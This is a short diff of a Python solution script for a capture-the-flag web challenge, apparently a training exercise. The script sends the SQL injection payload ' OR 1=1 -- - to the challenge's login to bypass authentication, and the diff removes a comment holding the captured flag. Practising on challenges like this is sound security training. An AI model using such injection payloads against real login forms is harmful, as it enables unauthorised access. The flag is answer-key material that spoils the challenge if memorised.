@@ -40,5 +40,3 @@ class Inj:
 inj = Inj('http://web-17.challs.olicyber.it/')
 response, error = inj.logic("' OR 1=1 -- -")
 print(response)
-
-# flag{1s_ths_h0w_l0g1ns_w0rk}
